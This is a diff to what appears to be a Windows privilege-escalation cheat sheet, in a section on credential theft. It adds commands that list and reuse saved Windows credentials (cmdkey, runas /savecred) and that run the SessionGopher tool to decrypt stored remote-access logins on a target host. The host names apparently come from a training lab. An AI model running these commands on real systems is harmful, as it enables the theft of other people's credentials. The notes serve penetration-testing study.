@@ -824,11 +824,17 @@ get-service | ? {$_.DisplayName -like 'Druva*'}
 
 # Credential Theft
 
-### Listing Saved Credentials
+### Saved Credentials
 ```powershell
 cmdkey /list
 runas /user:<domain>\<user> /savecred "COMMAND HERE"
 runas /user:inlanefreight\bob /savecred "whoami"
+```
+- [SessionGopher](https://github.com/Arvanaghi/SessionGopher) searches for and decrypts saved login information for remote access tools like (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
+- We need local admin access to retrieve stored session information. but it is always worth running as normal user
+```powershell
+Import-Module .\SessionGopher.ps1
+Invoke-SessionGopher -Target WINLPE-SRV01
 ```
 
 ### Browser Credentials
